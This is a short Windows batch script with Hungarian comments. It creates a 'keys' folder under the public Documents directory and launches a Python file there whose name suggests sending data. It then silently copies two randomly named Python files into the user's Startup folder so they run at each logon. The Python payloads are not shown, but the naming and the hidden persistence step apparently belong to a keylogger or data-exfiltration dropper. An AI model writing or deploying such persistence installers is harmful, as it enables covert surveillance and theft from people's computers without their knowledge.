@echo off

:: nyelvfüggetlen célmappa
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

python "%TARGET%\fwsendbfgw.py"
echo send elindult
echo.

:: user Startup mappa
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: .py fájlok bemásolása Startupba
copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\spwww743g7w.py" /Y >nul
copy "%~dp0fwsendbfgw.py" "%STARTUP_FOLDER%\fwsendbfgw.py" /Y >nul

echo Fájlok bemásolva a Startupba:
echo %STARTUP_FOLDER%
echo.

pause
